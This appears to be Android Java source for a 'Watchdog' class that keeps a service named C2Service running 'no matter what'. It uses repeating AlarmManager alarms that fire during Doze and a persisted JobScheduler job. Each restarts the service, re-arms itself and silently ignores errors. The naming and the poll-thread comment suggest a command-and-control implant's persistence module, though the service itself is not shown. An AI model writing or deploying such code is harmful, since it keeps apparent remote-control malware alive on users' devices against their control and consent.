package com.gls.sim1;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;

/**
 * Keeps C2Service alive no matter what: an idle-safe AlarmManager pulse plus a
 * persisted JobScheduler backup. Both resurrect the service if it is missing and
 * re-arm themselves. Inexact idle alarms need no special permission and still
 * fire inside Doze.
 */
public final class Watchdog {
    private static final int JOB_ID = 0x53494d31;
    private static final int REQ = 0x51;
    private static final long PULSE_MS = 60_000L;
    private static final long JOB_PERIOD_MS = 15 * 60 * 1000L;

    private Watchdog() {}

    public static void arm(Context ctx) {
        Context app = ctx.getApplicationContext();
        Foreground.set(app);
        scheduleAlarm(app, PULSE_MS);
        scheduleJob(app);
        ensureService(app);
    }

    public static void ensureService(Context app) {
        // Always poke the service even if it looks "running": onStartCommand runs
        // ensurePoller(), which revives a dead poll thread. A plain start on a
        // stopped service brings the whole thing back up.
        try {
            Intent i = new Intent(app, C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) app.startForegroundService(i);
            else app.startService(i);
        } catch (Exception ignored) {
        }
    }

    static void scheduleAlarm(Context app, long delayMs) {
        AlarmManager am = (AlarmManager) app.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        PendingIntent pi = alarmIntent(app);
        long at = SystemClock.elapsedRealtime() + Math.max(delayMs, 5_000L);
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi);
            }
        } catch (Exception ignored) {
        }
    }

    private static PendingIntent alarmIntent(Context app) {
        Intent i = new Intent(app, WatchdogReceiver.class).setAction(WatchdogReceiver.ACTION);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
        return PendingIntent.getBroadcast(app, REQ, i, flags);
    }

    static void scheduleJob(Context app) {
        if (Build.VERSION.SDK_INT < 21) return;
        JobScheduler js = (JobScheduler) app.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js == null) return;
        JobInfo job = new JobInfo.Builder(JOB_ID, new ComponentName(app, WatchdogJobService.class))
                .setPersisted(true)
                .setPeriodic(JOB_PERIOD_MS)
                .build();
        try {
            js.schedule(job);
        } catch (Exception ignored) {
        }
    }
}
